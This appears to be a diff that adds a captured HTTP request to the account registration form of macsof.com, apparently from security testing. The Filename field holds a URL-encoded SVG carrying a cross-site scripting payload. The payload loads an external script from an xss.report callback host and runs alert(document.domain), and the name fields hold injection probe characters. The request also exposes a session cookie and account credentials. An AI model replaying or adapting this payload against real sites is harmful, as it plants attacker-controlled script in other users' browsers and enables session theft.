@@ -1,0 +1,23 @@
+POST /web/account/register HTTP/1.1
+Host: macsof.com
+Cookie: PHPSESSID=46to85mi2si8lugeotl6r2qagqp9l4jg
+Content-Length: 1011
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://macsof.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://macsof.com/web/registration
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+FirstName=*&LastName=%22&UserName=r4sec&Address=fgghg&Email=soffense@gmail.com&Phone=2315128855&Password=11223344&ConfirmPassword=11223344&DOB=2002-06-11&Filename=%3c%3fxml+version%3d%221.0%22+standalone%3d%22no%22%3f%3e%0d%0a%3c%21DOCTYPE+svg+PUBLIC%0d%0a++%22-%2f%2fW3C%2f%2fDTD+SVG+1.1%2f%2fEN%22%0d%0a++%22http%3a%2f%2fwww.w3.org%2fGraphics%2fSVG%2f1.1%2fDTD%2fsvg11.dtd%22%3e%0d%0a++%3csvg+width%3d%22200%22%0d%0a+++++++height%3d%22200%22%0d%0a+++++++zoomAndPan%3d%22disable%22%0d%0a+++++++xmlns%3d%22http%3a%2f%2fwww.w3.org%2f2000%2fsvg%22%0d%0a+++++++xmlns%3axlink%3d%22http%3a%2f%2fwww.w3.org%2f1999%2fxlink%22%0d%0a+++++++xml%3aspace%3d%22preserve%22%3e%0d%0a++++%3c%21--+Script+linked+from+the+outside--%3e%0d%0a++++%3cscript+xlink%3ahref%3d%22https%3a%2f%2fxss.report%2fc%2fr4jesh%22+%2f%3e%0d%0a++++%3cscript%3e%0d%0a++++++%2f%2f%3c%21%5bCDATA%5b%0d%0a++++++++alert%28document.domain%29%3b%0d%0a++++++%5d%5d%3e%0d%0a++++%3c%2fscript%3e%0d%0a++%3c%2fsvg%3e%0d%0a%0d%0a%0d%0a&submit=Create+New+Account
